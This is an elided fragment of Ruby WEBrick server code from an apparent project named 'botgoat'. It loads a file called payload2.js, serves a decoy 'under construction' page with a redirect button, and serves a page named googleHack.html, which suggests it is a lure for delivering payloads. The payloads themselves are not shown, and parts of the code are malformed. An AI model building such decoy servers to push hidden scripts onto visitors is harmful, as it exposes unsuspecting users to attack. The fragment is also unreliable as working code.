...
$payload2 = File.read '/home/rt/botgoat/html/payload2.js'
$host = host 
$port = port
$resDef = 
     '<html>
   ...
   <head>
    <container> 
    <input type="button" onclick="redirect()" value=" sorry we are still under construction, click to go back to the main site">
   </container>
   <body>
  </html>'
...
class Juls < WEBrick::HTTPServlet::AbstractServlet
    ...
    def do_GET (request, response)
        response.status = 200
        response.content_type = "html"
        response.body = File.read "/home/rt/botgoat/html/googleHack.html"
    end
end
...
server = WEBrick::HTTPServer.new(
	...
	:SSLCertificate => cert,
	:SSLPrivateKey => pkey,
        :DocumentRoot => '/home/rt/botgoat/html/goat.html'
	)
